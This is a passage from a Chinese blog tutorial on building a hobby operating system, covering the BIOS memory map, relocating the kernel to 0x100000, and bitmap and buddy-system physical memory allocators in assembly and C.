ebx</span><br><span class="line">    jne .get_next_entry      ; 如果 EBX 非 0，则还有更多条目</span><br><span class="line"></span><br><span class="line">.done:</span><br><span class="line">	pop es</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>之后我们写一个打印这个结构体的函数，就可以看到对应空闲可分配的物理内存了（type=1）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250509170147949.png"
                      class=""
                >
<h4 id="更换内核加载地址">更换内核加载地址</h4>
<p>自己搓的小内核从0x9000-0x9FC00的大约75KB，这点大小可能以后会不够用，所以最好将其加载到0x100000处。这里我们开启A20总线后，实际上我们就可以通过段寄存器加偏移访问到1MB以上的内存了，比如<code>ES:BX = 0xFFFF:0x10 =&gt; 0x100000</code>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; boot.asm</span><br><span class="line">; 读取 kernel (加载 kernel.c 编译后的镜像) 到 0x100000</span><br><span class="line">    mov ah, 0x02         ; BIOS function: read sector</span><br><span class="line">    mov al, 20           ; 读取 20 个扇区</span><br><span class="line">    mov ch, 0            ; 柱面</span><br><span class="line">    mov cl, 4            ; 起始扇区（第4个扇区）</span><br><span class="line">    mov dh, 0            ; 磁头</span><br><span class="line">    mov dl, 0x00         ; 软盘</span><br><span class="line">          </span><br><span class="line">	mov bx, 0xffff	     ; 加载地址0x100000 , 0xffff * 16 + 0x10 = 0x100000</span><br><span class="line">	mov es, bx</span><br><span class="line">	mov bx, 0x10</span><br><span class="line">    int 0x13</span><br><span class="line">    jc disk_error</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250509213316618.png"
                      class=""
                >
<p>这里stage2跳转到内核需要进行一些修改，<code>retf</code> 是
<strong>远返回</strong> 指令，会从栈顶弹出 offset 和
segment（段选择器）并跳转。所以通过先 push 目标段地址、再 push
目标偏移，就可以模拟远跳转。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; stage2.asm</span><br><span class="line"></span><br><span class="line">[BITS 32]</span><br><span class="line">start:</span><br><span class="line">    mov eax, 0x100000     ; 内核入口地址</span><br><span class="line">    push dword 0x08       ; 代码段选择器</span><br><span class="line">    push eax              ; 入口地址</span><br><span class="line">    retf                  ; 执行远返回，相当于 jmp 0x08:0x100000</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后把<strong>linker.ld</strong>的加载起始地址换成0x100000，就可以正确进入内核执行了。</p>
<p>但这里还有个调试的问题，这里<strong>real-mode-gdb</strong>打印时是根据IP的地址进行打印，这里我们所以看到的code又从0地址处开始了，实际上执行还是正常的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250509213434987.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250509221352390.png"
                      class=""
                >
<p>那我们看到<strong>gdb_init_real_mode.txt</strong>里是怎么定义的，这里打印CODE是用<code>x /i $rip</code>，这里我们改成<strong>eip</strong>即可。调试相关内容可见<a
href="https://collectcrop.github.io/blog/2025/04/29/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5-bootloader%E7%BC%96%E5%86%99/#%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95">第一章节</a>。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">define context</span><br><span class="line">  printf &quot;---------------------------[ STACK ]---\n&quot;</span><br><span class="line">  _dump_memw $r_ss_sp 8</span><br><span class="line">  printf &quot;\n&quot;</span><br><span class="line">  set $_a = $r_ss_sp + 16</span><br><span class="line">  _dump_memw $_a 8</span><br><span class="line">  printf &quot;\n&quot;</span><br><span class="line">  printf &quot;---------------------------[ DS:SI ]---\n&quot;</span><br><span class="line">  print_data $ds $rsi</span><br><span class="line">  printf &quot;---------------------------[ ES:DI ]---\n&quot;</span><br><span class="line">  print_data $es $rdi</span><br><span class="line"></span><br><span class="line">  printf &quot;----------------------------[ CPU ]----\n&quot;</span><br><span class="line">  print_regs</span><br><span class="line">  print_eflags</span><br><span class="line">  printf &quot;---------------------------[ CODE ]----\n&quot;</span><br><span class="line"></span><br><span class="line">  set $_code_size = $CODE_SIZE</span><br><span class="line"></span><br><span class="line">  # disassemble</span><br><span class="line">  # first call x/i with an address</span><br><span class="line">  # subsequent calls to x/i will increment address</span><br><span class="line">  if ($_code_size &gt; 0)</span><br><span class="line">    x /i $rip</span><br><span class="line">    set $_code_size--</span><br><span class="line">  end</span><br><span class="line">  while ($_code_size &gt; 0)</span><br><span class="line">    x /i</span><br><span class="line">    set $_code_size--</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>
<h3 id="pmm实现">PMM实现</h3>
<h4 id="bitmap方案">bitmap方案</h4>
<p>pmm是一个物理内存的分配器，是后续实现slub等内存分配器的基础，所以我们要先进行实现。这里比较简单高效的方法是维护一个位图，一个二进制位表示一个内存页是否被分配出去。但实际上我们维护的<strong>bitmap</strong>是一个一个字节存在数组里的，每个<strong>bitmap</strong>表项代表8个物理页面。</p>
<p>这里我为了方便，选择把第一个可用entry完全交给内核使用。其中我把<strong>MAX_PHYS_MEM_SIZE</strong>直接写死到宏了，而不是通过之前得到的<strong>memory_map</strong>来获取最大可用物理空间大小，这是因为<strong>bitmap</strong>的定义此时只能在声明时指定其大小，目前还没有堆管理机制的动态内存可供分配，这里就简单的先手动指定一下，这时我们需要注意要进行边界检查，因为<strong>memory_map</strong>得到的内存段可能会超过<strong>bitmap</strong>的大小，从而在<strong>clear_bit</strong>时发生越界写。这里自己实现的简易<strong>printf</strong>函数调用了之前实现的<strong>screen.c</strong>里的输出到显存的接口。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/pmm.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 PMM</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_init</span><span class="params">(<span class="type">uint32_t</span> mem_size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配一个物理页面（返回物理地址）</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">pmm_alloc_page</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放一个物理页面</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(<span class="type">void</span>* p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印 PMM 的信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_print_info</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/pmm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span>  <span class="comment">// 如果你有通用打印接口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;layout.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PHYS_MEM_SIZE (1024 * 1024 * 128) <span class="comment">// 128MB</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITMAP_SIZE (MAX_PHYS_MEM_SIZE / PAGE_SIZE / 8)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint8_t</span> bitmap[BITMAP_SIZE];</span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> total_pages;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义内存映射表结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryMapEntry</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> base_addr;</span><br><span class="line">    <span class="type">uint64_t</span> length;</span><br><span class="line">    <span class="type">uint32_t</span> type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_bit</span><span class="params">(<span class="type">uint32_t</span> bit)</span> &#123;</span><br><span class="line">    bitmap[bit / <span class="number">8</span>] |= (<span class="number">1</span> &lt;&lt; (bit % <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear_bit</span><span class="params">(<span class="type">uint32_t</span> bit)</span> &#123;</span><br><span class="line">    bitmap[bit / <span class="number">8</span>] &amp;= ~(<span class="number">1</span> &lt;&lt; (bit % <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">test_bit</span><span class="params">(<span class="type">uint32_t</span> bit)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> bitmap[bit / <span class="number">8</span>] &amp; (<span class="number">1</span> &lt;&lt; (bit % <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pmm_init：初始化内存管理</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_init</span><span class="params">(<span class="type">uint32_t</span> memory_map_addr)</span> &#123;</span><br><span class="line">    <span class="type">uint16_t</span> entry_count = *(<span class="type">uint16_t</span>*)MEMORY_MAP_COUNT_ADDR;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">MemoryMapEntry</span>* <span class="title">mmap</span> =</span> (<span class="keyword">struct</span> MemoryMapEntry*)memory_map_addr;</span><br><span class="line">    total_pages = BITMAP_SIZE * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 所有页默认全部标记为“已使用”</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; BITMAP_SIZE; i++) &#123;</span><br><span class="line">        bitmap[i] = <span class="number">0xFF</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 遍历 memory map，只将 type==1 的区域设为“可用，从第二个entry开始，把第一个entry保留给内核使用”</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">1</span>; i &lt; entry_count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mmap[i].type != <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint64_t</span> base = mmap[i].base_addr;</span><br><span class="line">        <span class="type">uint64_t</span> length = mmap[i].length;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> start_page = base / PAGE_SIZE;</span><br><span class="line">        <span class="type">uint32_t</span> end_page = (base + length) / PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint32_t</span> j = start_page; j &lt; end_page; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j/<span class="number">8</span>&gt;=BITMAP_SIZE) <span class="keyword">break</span>;            <span class="comment">// 避免索引超出位图大小</span></span><br><span class="line">            clear_bit(j);  <span class="comment">// 标记为“空闲”</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 保留内核占用页</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="type">uint32_t</span> kernel_end;</span><br><span class="line">    <span class="type">uint32_t</span> used_pages = ((<span class="type">uint32_t</span>)&amp;kernel_end + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; used_pages; i++) &#123;</span><br><span class="line">        set_bit(i);  <span class="comment">// 保留内核占用页</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">pmm_alloc_page</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; total_pages; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!test_bit(i)) &#123;</span><br><span class="line">            set_bit(i);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">void</span>*)(i * PAGE_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// no free page</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(<span class="type">void</span>* addr)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> index = (<span class="type">uint32_t</span>)addr / PAGE_SIZE;</span><br><span class="line">    clear_bit(index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_print_info</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pages_per_row = <span class="number">64</span>;</span><br><span class="line">    kernel_printf(<span class="string">&quot;Physical Memory Bitmap (#=used, .=free):\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; total_pages; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % pages_per_row == <span class="number">0</span>) &#123;</span><br><span class="line">            kernel_printf(<span class="string">&quot;\n%u: &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        print_char(test_bit(i) ? <span class="string">&#x27;#&#x27;</span> : <span class="string">&#x27;.&#x27;</span>); <span class="comment">// &#x27;#&#x27; 表示已占用，&#x27;.&#x27; 表示空闲</span></span><br><span class="line">    &#125;</span><br><span class="line">    kernel_printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// kernel/kernel.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;idt.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;isr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;irq.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;layout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="comment">// #include &quot;keyboard.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    clear_screen();         <span class="comment">// 清屏</span></span><br><span class="line">    print_string(<span class="string">&quot;Hello, Kernel!\n&quot;</span>);  <span class="comment">// 打印一行字符</span></span><br><span class="line">    print_memory_map();</span><br><span class="line">    idt_install();</span><br><span class="line">    irq_remap();</span><br><span class="line">    isr_install();</span><br><span class="line">    irq_install();</span><br><span class="line">    </span><br><span class="line">    pmm_init(MEMORY_MAP_ADDR);      <span class="comment">//  初始化物理内存管理</span></span><br><span class="line">    <span class="comment">// pmm_print_info();</span></span><br><span class="line">    <span class="type">void</span>* page1 = pmm_alloc_page();</span><br><span class="line">    kernel_printf(<span class="string">&quot;Allocated page: %x\n&quot;</span>,page1);</span><br><span class="line">    <span class="type">void</span>* page2 = pmm_alloc_page();</span><br><span class="line">    kernel_printf(<span class="string">&quot;Allocated page: %x\n&quot;</span>,page2);</span><br><span class="line">    pmm_free_page(page1);</span><br><span class="line">    pmm_free_page(page2);</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sti&quot;</span>)</span>;    <span class="comment">// 开中断</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123; </span><br><span class="line">        <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;hlt&quot;</span>)</span>;  <span class="comment">// 节省CPU</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// include/layout.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMORY_MAP_COUNT_ADDR 0x4FFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMORY_MAP_ADDR 0x5000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STAGE2_ADDR 0x8000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL_ADDR 0x9000</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lib/printf.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, format);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (*format) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*format == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">            format++;</span><br><span class="line">            <span class="keyword">if</span> (*format == <span class="string">&#x27;d&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">int</span> val = va_arg(args, <span class="type">int</span>);</span><br><span class="line">                print_dec(val);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*format == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> val = va_arg(args, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">                print_unsigned(val);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*format == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">int</span> val = va_arg(args, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">                print_hex(val);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*format == <span class="string">&#x27;l&#x27;</span> &amp;&amp; *(format + <span class="number">1</span>) == <span class="string">&#x27;l&#x27;</span> &amp;&amp; *(format + <span class="number">2</span>) == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">                format += <span class="number">2</span>;  <span class="comment">// skip &quot;ll&quot;</span></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> val = va_arg(args, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>);</span><br><span class="line">                print_hex64(val);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*format == <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">const</span> <span class="type">char</span> *str = va_arg(args, <span class="type">const</span> <span class="type">char</span> *);</span><br><span class="line">                print_string(str);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*format == <span class="string">&#x27;c&#x27;</span>) &#123;</span><br><span class="line">                <span class="type">char</span> c = (<span class="type">char</span>)va_arg(args, <span class="type">int</span>);</span><br><span class="line">                print_char(c);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_char(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">                print_char(*format);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            print_char(*format);</span><br><span class="line">        &#125;</span><br><span class="line">        format++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    va_end(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8-%E7%AE%80%E5%8D%95%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6%E5%AE%9E%E7%8E%B0/image-20250509233045245.png"
                      class=""
                >
<h4 id="buddy-system方案">buddy system方案</h4>
<p>实际上直接用bitmap方案实现物理内存分配存在诸多问题，比如分配效率较低，每次都需要遍历bitmap来查找第一段可用的内存，尤其是当内存快占用满时效率很低。所以可以换用buddy
system方案。核心思路就是用链表管理不同的连续的页块，连续的大小都为2的幂次，当某个大小的链表为空而又有新的内存分配申请时，就会往高一级大小的链表取大块进行拆分，如果高一级链表也为空，就逐个向上找有块的链表。释放时也会判断与其相邻的块是否空闲，空闲则合并了放入较大大小的链表。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/pmm.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ORDER 10  <span class="comment">// 支持最大2^10=1024页的块（即4MB）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PAGES (512 * 1024 * 1024 / 4096)  <span class="comment">// 512MB / 4KB = 131072 页</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="type">uint8_t</span> order;     <span class="comment">// 当前块的阶</span></span><br><span class="line">    <span class="type">uint8_t</span> used;      <span class="comment">// 是否已被分配</span></span><br><span class="line">    <span class="type">uint8_t</span> is_head;  <span class="comment">// 是否为块的起始页</span></span><br><span class="line">&#125; Page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PageLinkList</span>  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span>* <span class="title">head</span>;</span>      <span class="comment">// 链表头节点</span></span><br><span class="line">    <span class="type">uint32_t</span> count;         <span class="comment">// 当前空闲链表长度</span></span><br><span class="line">&#125; PageLinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化 PMM</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_init</span><span class="params">(<span class="type">uint32_t</span> mem_size)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配一个物理页面（返回物理地址）</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">pmm_alloc_page</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配多个物理页面（返回物理地址）</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">pmm_alloc_pages</span><span class="params">(<span class="type">uint32_t</span> count)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放一个块</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_free_page</span><span class="params">(Page* p)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印 PMM 的信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmm_print_info</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/pmm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;screen.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span>  <span class="comment">// 如果你有通用打印接口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;layout.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;panic.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义内存映射表结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryMapEntry</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> base_addr;</span><br><span class="line">    <span class="type">uint64_t</span> length;</span><br><span class="line">    <span class="type">uint32_t</span> type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Page page_array[MAX_PAGES];               <span class="comment">// 页结构数组，这里用Page类型是因为方便后续直接加入free链表</span></span><br><span class="line"><span class="type">static</span> PageLinkList free_list[MAX_ORDER+<span class="number">1</span>];           <span class="comment">// 每阶空闲链表</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> total_pages;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_to_free_list</span><span class="params">(Page* p, <span class="type">uint8_t</span> order)</span> &#123;         <span class="comment">// 插入到链表头部</span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>||order &gt; MAX_ORDER||!p-&gt;is_head) <span class="keyword">return</span>;</span><br><span class="line">    p-&gt;next = free_list[order].head;</span><br><span class="line">    free_list[order].head = p;</span><br><span class="line">    free_list[order].count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_from_free_list</span><span class="params">(Page* p, <span class="type">uint8_t</span> order)</span> &#123;       <span class="comment">// 从链表中删除指定节点</span></span><br><span class="line">    